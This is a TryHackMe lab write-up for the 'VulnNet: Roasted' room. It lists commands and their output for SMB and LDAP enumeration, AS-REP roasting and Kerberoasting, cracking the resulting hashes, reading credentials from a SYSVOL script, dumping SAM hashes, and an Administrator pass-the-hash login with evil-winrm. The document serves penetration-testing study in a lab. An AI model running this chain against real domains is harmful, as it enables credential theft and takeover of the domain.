# TryHackMe-VulnNet: Roasted

**Scope:**

- Security Account Manager (SAM)
- ASREPRoasting
- Kerberos Ticket Granting Service (TGS)
- Keberoasting

**Keywords:**

- Server Message Block (SMB) Enumeration
- Lightweight Directory Access Protocol (LDAP) Enumeration
- Kerberos Enumeration & ASREPRoasting
- impacket-lookupsid
- kerbrute_linux_amd64
- impacket-GetNPUsers
- name-that-hash
- Keberoasting & Kerberos Ticket Granting Service (TGS)
- SMB Share & Privilege Enumeration
- SAM Hash Dumping
- secretsdump.py
- Privilege Escalation with WinRM

**Main Commands:**

- `nmap -sSVC -T4 -A -O -oN nmap_result.txt -Pn -p- --min-rate 1000 --max-retries 3 $target_ip`
- `crackmapexec smb $target_ip -u 'anonymous' -p '' --shares`
- `smbmap -H $target_ip -u anonymous`
- `rpcclient -U "" -N vulnnet.thm`
- `smbclient -U '' \\\\vulnnet.thm\\IPC$`
- `ldapsearch -H ldap://vulnnet.thm:389 -x -s base -b '' "(objectClass=*)" "*"`
- `nmap -sV -oN nmap_ldap.txt -A -O -p 389,636,3268,3269 -Pn --script="ldap* and not brute" $target_ip`
- `nmap -p 88 -oN nmap_kerberos.txt --script="krb5-enum-users" --script-args krb5-enum-users.realm='vulnnet-rst.local',userdb=/usr/share/seclists/Usernames/cirt-default-usernames.txt -Pn $target_ip`
- `impacket-lookupsid anonymous@$target_ip -no-pass -domain-sids`
- `./kerbrute_linux_amd64 userenum --dc $target_ip -d vulnnet-rst.local users_ext.txt`
- `impacket-GetNPUsers 'VULNNET-RST/' -usersfile active_users.txt -no-pass -request -dc-ip $target_ip`
- `impacket-GetNPUsers 'VULNNET-RST/' -usersfile active_users.txt -no-pass -request -dc-ip $target_ip -format john`
- `name-that-hash -f skidhash.txt`
- `sudo john skidhash.txt --wordlist=/usr/share/wordlists/rockyou.txt`
- `hashcat -m 18200 skidhash.txt --force /usr/share/wordlists/rockyou.txt`
- `impacket-GetUserSPNs VULNNET-RST.local/t-skid:'tj072889*' -request -dc-ip $target_ip`
- `sudo john enterprisehash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs`
- `crackmapexec smb $target_ip -u 'enterprise-core-vn' -p 'ry=ibfkfv,s6h,' --shares`
- `smbclient -U 'enterprise-core-vn' \\\\$target_ip\\SYSVOL`
- `smbclient -U 'a-whitehat' \\\\$target_ip\\SYSVOL`
- `smbmap -H $target_ip -u 'a-whitehat' -p 'bNdKVkjv3RR9ht'`
- `secretsdump.py VULNNET-RST.local/a-whitehat:bNdKVkjv3RR9ht@$target_ip`
- `evil-winrm -i $target_ip -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d`

### Laboratory Environment

[VulnNet: Roasted](https://tryhackme.com/r/room/vulnnetroasted)

### Penetration Approaches and Commands

> **Network Enumeration Phase**
> 

`nmap -sSVC -T4 -A -O -oN nmap_result.txt -Pn -p- --min-rate 1000 --max-retries 3 $target_ip`

```powershell
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-30 09:35:15Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49665/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (88%)
Aggressive OS guesses: Microsoft Windows Server 2019 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -3m10s
| smb2-time: 
|   date: 2024-12-30T09:36:22
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

> **Server Message Block (SMB) Enumeration Phase**
> 

`crackmapexec smb $target_ip -u 'anonymous' -p '' --shares`

```powershell
SMB         10.10.11.61     445    WIN-2BO8M1OE1M1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)
SMB         10.10.11.61     445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\anonymous: 
SMB         10.10.11.61     445    WIN-2BO8M1OE1M1  [+] Enumerated shares
SMB         10.10.11.61     445    WIN-2BO8M1OE1M1  Share           Permissions     Remark
SMB         10.10.11.61     445    WIN-2BO8M1OE1M1  -----           -----------     ------
SMB         10.10.11.61     445    WIN-2BO8M1OE1M1  ADMIN$                          Remote Admin
SMB         10.10.11.61     445    WIN-2BO8M1OE1M1  C$                              Default share
SMB         10.10.11.61     445    WIN-2BO8M1OE1M1  IPC$            READ            Remote IPC
SMB         10.10.11.61     445    WIN-2BO8M1OE1M1  NETLOGON                        Logon server share 
SMB         10.10.11.61     445    WIN-2BO8M1OE1M1  SYSVOL                          Logon server share 
SMB         10.10.11.61     445    WIN-2BO8M1OE1M1  VulnNet-Business-Anonymous READ            VulnNet Business Sharing
SMB         10.10.11.61     445    WIN-2BO8M1OE1M1  VulnNet-Enterprise-Anonymous READ            VulnNet Enterprise Sharing
```

`nano /etc/hosts`

```powershell
10.10.11.61 vulnnet-rst.local vulnnet.thm
```

`smbmap -H $target_ip -u anonymous`

```powershell
[+] Guest session       IP: 10.10.11.61:445     Name: ip-10-10-11-61.eu-west-1.compute.internal         
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        SYSVOL                                                  NO ACCESS       Logon server share 
        VulnNet-Business-Anonymous                              READ ONLY       VulnNet Business Sharing
        VulnNet-Enterprise-Anonymous                            READ ONLY       VulnNet Enterprise Sharing
```

`rpcclient -U "" -N vulnnet.thm`

```powershell
rpcclient $> enumdomains
result was NT_STATUS_ACCESS_DENIED
rpcclient $> enumdomgroups
result was NT_STATUS_ACCESS_DENIED
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> 
```

`smbclient -U '' \\\\vulnnet.thm\\IPC$`

```powershell
smb: \> dir
NT_STATUS_NO_SUCH_FILE listing \*
smb: \> 
```

> **Lightweight Directory Access Protocol (LDAP) Enumeration**
> 

`ldapsearch -H ldap://vulnnet.thm:389 -x -s base -b '' "(objectClass=*)" "*"`

```powershell
# extended LDIF
#
# LDAPv3
# base <> with scope baseObject
# filter: (objectClass=)
# requesting:  
#

#
dn:

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

```

`nmap -sV -oN nmap_ldap.txt -A -O -p 389,636,3268,3269 -Pn --script="ldap* and not brute" $target_ip`

```powershell
PORT     STATE    SERVICE          VERSION
389/tcp  filtered ldap
636/tcp  filtered ldapssl
3268/tcp filtered globalcatLDAP
3269/tcp filtered globalcatLDAPssl
```

> **Kerberos Enumeration & ASREPRoasting Phase**
> 

`nmap -p 88 -oN nmap_kerberos.txt --script="krb5-enum-users" --script-args krb5-enum-users.realm='vulnnet-rst.local',userdb=/usr/share/seclists/Usernames/cirt-default-usernames.txt -Pn $target_ip`

```powershell
PORT   STATE SERVICE
88/tcp open  kerberos-sec
| krb5-enum-users: 
| Discovered Kerberos principals
|     guest@vulnnet-rst.local
|     ADMINISTRATOR@vulnnet-rst.local
|     Guest@vulnnet-rst.local
|     GUEST@vulnnet-rst.local
|     Administrator@vulnnet-rst.local
|_    administrator@vulnnet-rst.local
```

`impacket-lookupsid anonymous@$target_ip -no-pass -domain-sids`

```powershell
[*] Brute forcing SIDs at 10.10.12.243
[*] StringBinding ncacn_np:10.10.12.243[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213
498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: VULNNET-RST\Administrator (SidTypeUser)
501: VULNNET-RST\Guest (SidTypeUser)
502: VULNNET-RST\krbtgt (SidTypeUser)
512: VULNNET-RST\Domain Admins (SidTypeGroup)
513: VULNNET-RST\Domain Users (SidTypeGroup)
514: VULNNET-RST\Domain Guests (SidTypeGroup)
515: VULNNET-RST\Domain Computers (SidTypeGroup)
516: VULNNET-RST\Domain Controllers (SidTypeGroup)
517: VULNNET-RST\Cert Publishers (SidTypeAlias)
518: VULNNET-RST\Schema Admins (SidTypeGroup)
519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
525: VULNNET-RST\Protected Users (SidTypeGroup)
526: VULNNET-RST\Key Admins (SidTypeGroup)
527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
1105: VULNNET-RST\a-whitehat (SidTypeUser)
1109: VULNNET-RST\t-skid (SidTypeUser)
1110: VULNNET-RST\j-goldenhand (SidTypeUser)
1111: VULNNET-RST\j-leet (SidTypeUser)
```

`nano users_ker.txt`

```powershell
Administrator
Guest
krbtgt
WIN-2BO8M1OE1M1$
enterprise-core-vn
a-whitehat
t-skid
j-goldenhand
j-leet
```

`nano users_ext.txt`

```powershell
Administrator@VULNNET-RST
Guest@VULNNET-RST
krbtgt@VULNNET-RST
WIN-2BO8M1OE1M1$@VULNNET-RST
enterprise-core-vn@VULNNET-RST
a-whitehat@VULNNET-RST
t-skid@VULNNET-RST
j-goldenhand@VULNNET-RST
j-leet@VULNNET-RST
```

`./kerbrute_linux_amd64 userenum --dc $target_ip -d vulnnet-rst.local users_ext.txt`

```powershell
2024/12/30 05:19:05 >  [+] VALID USERNAME:       Administrator@vulnnet-rst.local
2024/12/30 05:19:05 >  [+] VALID USERNAME:       j-goldenhand@vulnnet-rst.local
2024/12/30 05:19:05 >  [+] VALID USERNAME:       j-leet@vulnnet-rst.local
2024/12/30 05:19:05 >  [+] VALID USERNAME:       a-whitehat@vulnnet-rst.local
2024/12/30 05:19:05 >  [+] VALID USERNAME:       WIN-2BO8M1OE1M1$@vulnnet-rst.local
2024/12/30 05:19:05 >  [+] VALID USERNAME:       enterprise-core-vn@vulnnet-rst.local
2024/12/30 05:19:05 >  [+] VALID USERNAME:       t-skid@vulnnet-rst.local
2024/12/30 05:19:05 >  [+] VALID USERNAME:       Guest@vulnnet-rst.local
```

**For source:**

[https://github.com/ropnop/kerbrute/](https://github.com/ropnop/kerbrute/)

`nano active_users.txt`

```powershell
Administrator
j-goldenhand
j-leet
a-whitehat
WIN-2BO8M1OE1M1$
enterprise-core-vn
t-skid
Guest
```

`impacket-GetNPUsers 'VULNNET-RST/' -usersfile active_users.txt -no-pass -request -dc-ip $target_ip`

```powershell
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User WIN-2BO8M1OE1M1$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User enterprise-core-vn doesn't have UF_DONT_REQUIRE_PREAUTH set

$krb5asrep$23$t-skid@VULNNET-RST:e545b64f495b4630248b8614cfc84f9d$5d74e65df4b8c71d8535bc569e713f8cb47ec71277609f3c5f699a1d80bc3a073af908ef9ef24528b3d16eb83b7d7b3cb4b6ff010f2ec9dcf52e10e2c654a7f4320d8b6ef1973a3450106eb30b472144fd177cdd65675881e9ad2648e5335819609f77c1f1ce3b9a6aefbca9a1866e0bf56f8fb9c084cc4e7c5a25cda7d64ea53eb9318fda570a58dafbc3e3c4b0b378affe8009f2e841b1478fa4d1e01353c2412ae08e14df765ebe07ca7dffc9b517f9aaf0acb03672c0905167eb3c904ff408cb8e1594de48bc88bbbbc1b51634b7e21c1fd654d0a5f7707f40356ed5b9340b6a67be107ef2d6b99f0631d9adc2e8

[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
```

`impacket-GetNPUsers 'VULNNET-RST/' -usersfile active_users.txt -no-pass -request -dc-ip $target_ip -format john`

```powershell
$krb5asrep$t-skid@VULNNET-RST:375fa5655ec52d7d341e2863193c9cb4$0f82dce38db117f83e6571037fc7e9836101084d2823adb5a9e02a6b1e549d98516596a58ecb2fc90094809f6400a8b49bc0fc263539f8b88cff63db564e7e5983bdae9c0b2799c5e4fa9923a474da03011e3a8b811387f960476e046d32d1f820985924b5558c7e0ffaf93a90678149af56649bb22421c834e8871cf93d7a542e9fa07ef03b3802b8f38f6e47e7b46485746ef7cf684cc9eb4d68d01fd2eb8d2762d0f613e7a962d2bf039cab7a17423c868d8882bbd30e8de3342b355f60b22c5b5fbaa24bfcdb630562ad761ca90ecf8f24a6484553d6ec95c436a1f634e1c4d64706ccbf525c8d294c2d3312dfc2
```

> **Hash Cracking Phase**
> 

`nano skidhash.txt`

```powershell
$krb5asrep$t-skid@VULNNET-RST:375fa5655ec52d7d341e2863193c9cb4$0f82dce38db117f83e6571037fc7e9836101084d2823adb5a9e02a6b1e549d98516596a58ecb2fc90094809f6400a8b49bc0fc263539f8b88cff63db564e7e5983bdae9c0b2799c5e4fa9923a474da03011e3a8b811387f960476e046d32d1f820985924b5558c7e0ffaf93a90678149af56649bb22421c834e8871cf93d7a542e9fa07ef03b3802b8f38f6e47e7b46485746ef7cf684cc9eb4d68d01fd2eb8d2762d0f613e7a962d2bf039cab7a17423c868d8882bbd30e8de3342b355f60b22c5b5fbaa24bfcdb630562ad761ca90ecf8f24a6484553d6ec95c436a1f634e1c4d64706ccbf525c8d294c2d3312dfc2
```

`name-that-hash -f skidhash.txt`

```powershell
Most Likely 
Kerberos 5 AS-REP etype 23, HC: 18200 JtR: krb5pa-sha1 Summary: Used for Windows Active 
Directory
```

`sudo john skidhash.txt --wordlist=/usr/share/wordlists/rockyou.txt`

```powershell
tj072889*        ($krb5asrep$t-skid@VULNNET-RST)
```

`hashcat -m 18200 skidhash.txt --force /usr/share/wordlists/rockyou.txt`

```powershell
tj072889*
```

> **Keberoasting & Kerberos Ticket Granting Service (TGS) Phase**
> 

`impacket-GetUserSPNs VULNNET-RST.local/t-skid:'tj072889*' -request -dc-ip $target_ip`

```powershell
ServicePrincipalName    Name                MemberOf                                                       PasswordLastSet             LastLogon                   Delegation 
----------------------  ------------------  -------------------------------------------------------------  --------------------------  --------------------------  ----------
CIFS/vulnnet-rst.local  enterprise-core-vn  CN=Remote Management Users,CN=Builtin,DC=vulnnet-rst,DC=local  2021-03-11 14:45:09.913979  2021-03-13 18:41:17.987528             

[-] CCache file is not found. Skipping...
$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$VULNNET-RST.local/enterprise-core-vn*$84ba57fa11decfcf1659b647cbccf154$f02197602d445222a02093ba9a9d89d967b5eb71042225e7020dd3b46cafb5170ace906ab8d4769c53ba1b57e55e9cd3e4fcc2430a74484e23e1f56c2aeffd9e3bc95ea0c1f5f5c39ece159aa81facbdc8c6777e62c178a3fb1b7f641875c4b2e1233584403874a35cf2d6caef84cbd6aad759eb530c7e4a94c961e48d1d6ee38c5cc9b01827b034c21a96e5d01f5e52ff3d2e7835dc03b3d9ab251c95a49ad4b5d548a0763c54aba85e59bae9760053ace27e52d50c7af6e513d70f3c82a897d8f9c2db44d2016f4dbf96308e7839d1c5e73b1e4802b7e4755dd698106f94f775feb5be081f8e0ab87f8db416908a64df167221ca9c88f62ec8d2e44bed475e66665089c8d11c0a6ddc31284fcf31443bca268b7591f017fd3c58ae1886b9c2bc0862d81bebb3b89cefa84c27956039d40251b9a610b5c679c56854d0d1786934542abf4f568e1c54c08f4f5560988e24c5cecd7f82d0fe6f159ce7ffa7c5fbbfb3b44a411a205626dd3fa9475e855fa077fb9032dd9cf6ea10669c79fe255714e3a4a9b72fa99b1b13a0bddef210ae0933831906a08cb1aa1637f880b4fac08d70cdbc7e740d316facf66f7d63735eb830e86cdb3eb46274c3f9eeb50438a32018773796d596856ced0c35c4bce87a55017d86afb23d7682d82496942253cc966f8c7526f13a5b8febef387175ab0f89a7bf17eb0b4e83c218564f9ab2a9a31167e466c545c7207be2f850282f586248b689d51fee8a240ca3db6b8e70a0e7fc491059137b598fbc30a23ae09175547c0b6da86d3739b5a28ee842a667ec77641b307f581a56bbef6a15a687b1652585767afeeb6acb47f78846e3eac1021b0431b49b3c64a6f66466b8f834a62e693a50509637ed9496a0251c2049be4b0a425d36d7b9dc3bc0871fc195e5f00276edea1b656b7fb01e9b5afa406386e3e053812d422f720e3aa94d019deac97be634884c0f9f9d7f45bf68a48566a0f8d74a2145eaeef962de4bf5d25546af51abfe4ac6affb81da9f25374d85671461c3c1bf19d39f3afc11af1f746829fa01aac8a4243229935e0e010d3c7f8495c8f430487ab9a216d62f4fd86bbce86cee60922b5621d2760a47c9d071f4ba21fe3433dd59facb91688fffae8cbec25ad3fb9818bc6b9f07e13ba85c1bf9d4fa60b4d04b8db15b33471bf5e5795aa75aeb44447b6aea3d47439cfd93782de3716407638bcf9e572c012bbd00f3d927fa4c109302d54613fb4052e0538117dcb522fa1f18b993af275848cfea1ab9c8fd35addb2ce14b8c28e1f01c4b00a35ee3a0fdf45062dedb58831bc8be02f5e1f1cad0ddc7fcbc714f0a4dd03d67eb2acf4d61c39179c6ae0ce25f357bcc6c4b667a3aa950fa23d82ed11138eab85831
```

`nano enterprisehash.txt`

```powershell
$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$VULNNET-RST.local/enterprise-core-vn*$84ba57fa11decfcf1659b647cbccf154$f02197602d445222a02093ba9a9d89d967b5eb71042225e7020dd3b46cafb5170ace906ab8d4769c53ba1b57e55e9cd3e4fcc2430a74484e23e1f56c2aeffd9e3bc95ea0c1f5f5c39ece159aa81facbdc8c6777e62c178a3fb1b7f641875c4b2e1233584403874a35cf2d6caef84cbd6aad759eb530c7e4a94c961e48d1d6ee38c5cc9b01827b034c21a96e5d01f5e52ff3d2e7835dc03b3d9ab251c95a49ad4b5d548a0763c54aba85e59bae9760053ace27e52d50c7af6e513d70f3c82a897d8f9c2db44d2016f4dbf96308e7839d1c5e73b1e4802b7e4755dd698106f94f775feb5be081f8e0ab87f8db416908a64df167221ca9c88f62ec8d2e44bed475e66665089c8d11c0a6ddc31284fcf31443bca268b7591f017fd3c58ae1886b9c2bc0862d81bebb3b89cefa84c27956039d40251b9a610b5c679c56854d0d1786934542abf4f568e1c54c08f4f5560988e24c5cecd7f82d0fe6f159ce7ffa7c5fbbfb3b44a411a205626dd3fa9475e855fa077fb9032dd9cf6ea10669c79fe255714e3a4a9b72fa99b1b13a0bddef210ae0933831906a08cb1aa1637f880b4fac08d70cdbc7e740d316facf66f7d63735eb830e86cdb3eb46274c3f9eeb50438a32018773796d596856ced0c35c4bce87a55017d86afb23d7682d82496942253cc966f8c7526f13a5b8febef387175ab0f89a7bf17eb0b4e83c218564f9ab2a9a31167e466c545c7207be2f850282f586248b689d51fee8a240ca3db6b8e70a0e7fc491059137b598fbc30a23ae09175547c0b6da86d3739b5a28ee842a667ec77641b307f581a56bbef6a15a687b1652585767afeeb6acb47f78846e3eac1021b0431b49b3c64a6f66466b8f834a62e693a50509637ed9496a0251c2049be4b0a425d36d7b9dc3bc0871fc195e5f00276edea1b656b7fb01e9b5afa406386e3e053812d422f720e3aa94d019deac97be634884c0f9f9d7f45bf68a48566a0f8d74a2145eaeef962de4bf5d25546af51abfe4ac6affb81da9f25374d85671461c3c1bf19d39f3afc11af1f746829fa01aac8a4243229935e0e010d3c7f8495c8f430487ab9a216d62f4fd86bbce86cee60922b5621d2760a47c9d071f4ba21fe3433dd59facb91688fffae8cbec25ad3fb9818bc6b9f07e13ba85c1bf9d4fa60b4d04b8db15b33471bf5e5795aa75aeb44447b6aea3d47439cfd93782de3716407638bcf9e572c012bbd00f3d927fa4c109302d54613fb4052e0538117dcb522fa1f18b993af275848cfea1ab9c8fd35addb2ce14b8c28e1f01c4b00a35ee3a0fdf45062dedb58831bc8be02f5e1f1cad0ddc7fcbc714f0a4dd03d67eb2acf4d61c39179c6ae0ce25f357bcc6c4b667a3aa950fa23d82ed11138eab85831
```

`sudo john enterprisehash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs`

```powershell
ry=ibfkfv,s6h,   (?) 
```

> **SMB Share & Privilege Enumeration Phase**
> 

`crackmapexec smb $target_ip -u 'enterprise-core-vn' -p 'ry=ibfkfv,s6h,' --shares`

```powershell
SMB         10.10.12.243    445    WIN-2BO8M1OE1M1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)
SMB         10.10.12.243    445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\enterprise-core-vn:ry=ibfkfv,s6h, 
SMB         10.10.12.243    445    WIN-2BO8M1OE1M1  [+] Enumerated shares
SMB         10.10.12.243    445    WIN-2BO8M1OE1M1  Share           Permissions     Remark
SMB         10.10.12.243    445    WIN-2BO8M1OE1M1  -----           -----------     ------
SMB         10.10.12.243    445    WIN-2BO8M1OE1M1  ADMIN$                          Remote Admin
SMB         10.10.12.243    445    WIN-2BO8M1OE1M1  C$                              Default share
SMB         10.10.12.243    445    WIN-2BO8M1OE1M1  IPC$            READ            Remote IPC
SMB         10.10.12.243    445    WIN-2BO8M1OE1M1  NETLOGON        READ            Logon server share 
SMB         10.10.12.243    445    WIN-2BO8M1OE1M1  SYSVOL          READ            Logon server share 
SMB         10.10.12.243    445    WIN-2BO8M1OE1M1  VulnNet-Business-Anonymous READ            VulnNet Business Sharing
SMB         10.10.12.243    445    WIN-2BO8M1OE1M1  VulnNet-Enterprise-Anonymous READ            VulnNet Enterprise Sharing

```

`smbclient -U 'enterprise-core-vn' \\\\$target_ip\\SYSVOL`

```powershell
Password for [WORKGROUP\enterprise-core-vn]: ry=ibfkfv,s6h,

smb: \> dir
  .                                   D        0  Thu Mar 11 14:19:49 2021
  ..                                  D        0  Thu Mar 11 14:19:49 2021
  vulnnet-rst.local                  Dr        0  Thu Mar 11 14:19:49 2021

                8771839 blocks of size 4096. 4523155 blocks available
smb: \> cd vulnnet-rst.local\
smb: \vulnnet-rst.local\> dir
  .                                   D        0  Thu Mar 11 14:23:40 2021
  ..                                  D        0  Thu Mar 11 14:23:40 2021
  DfsrPrivate                      DHSr        0  Thu Mar 11 14:23:40 2021
  Policies                            D        0  Thu Mar 11 14:20:26 2021
  scripts                             D        0  Tue Mar 16 19:15:49 2021

                8771839 blocks of size 4096. 4523091 blocks available
smb: \vulnnet-rst.local\> cd scripts
smb: \vulnnet-rst.local\scripts\> dir
  .                                   D        0  Tue Mar 16 19:15:49 2021
  ..                                  D        0  Tue Mar 16 19:15:49 2021
  ResetPassword.vbs                   A     2821  Tue Mar 16 19:18:14 2021

                8771839 blocks of size 4096. 4523091 blocks available
smb: \vulnnet-rst.local\scripts\> get ResetPassword.vbs
getting file \vulnnet-rst.local\scripts\ResetPassword.vbs of size 2821 as ResetPassword.vbs (1.1 KiloBytes/sec) (average 1.1 KiloBytes/sec)
smb: \vulnnet-rst.local\scripts\> 
```

`cat ResetPassword.vbs`

```powershell
[REDACTED] - MORE

strUserNTName = "a-whitehat"
strPassword = "bNdKVkjv3RR9ht"

[REDACTED] - MORE
```

`smbclient -U 'a-whitehat' \\\\$target_ip\\SYSVOL`

```powershell
Password for [WORKGROUP\a-whitehat]: bNdKVkjv3RR9ht

smb: \> dir
  .                                   D        0  Thu Mar 11 14:19:49 2021
  ..                                  D        0  Thu Mar 11 14:19:49 2021
  vulnnet-rst.local                  Dr        0  Thu Mar 11 14:19:49 2021

                8771839 blocks of size 4096. 4527211 blocks available
smb: \> 
```

`smbmap -H $target_ip -u 'a-whitehat' -p 'bNdKVkjv3RR9ht'`

```powershell
[+] IP: 10.10.12.243:445        Name: ip-10-10-12-243.eu-west-1.compute.internal        
[/] Work[!] Unable to remove test directory at \\10.10.12.243\SYSVOL\MFCHWDLGRU, please remove manually
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  READ, WRITE     Remote Admin
        C$                                                      READ, WRITE     Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ, WRITE     Logon server share 
        SYSVOL                                                  READ, WRITE     Logon server share 
        VulnNet-Business-Anonymous                              READ ONLY       VulnNet Business Sharing
        VulnNet-Enterprise-Anonymous                            READ ONLY       VulnNet Enterprise Sharing
```

> **SAM Hash Dumping Phase**
> 

`secretsdump.py VULNNET-RST.local/a-whitehat:bNdKVkjv3RR9ht@$target_ip`

```powershell
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xf10a2788aef5f622149a41b2c745f49a
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
```

> **Privilege Escalation with WinRM**
> 

`evil-winrm -i $target_ip -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d`

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
vulnnet-rst\administrator

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled

*Evil-WinRM* PS C:\Users\Administrator\Documents> 

```

# Appendix

## Security Account Manager (SAM)

<aside>
💡

The SAM hash on Windows refers to the hashed representation of user account passwords stored in the Security Account Manager (SAM) database. SAM is a critical system file in Windows that stores information about local user accounts, including their security identifiers (SIDs), account policies, and hashed passwords.

</aside>

## ASREPRoasting

<aside>
💡

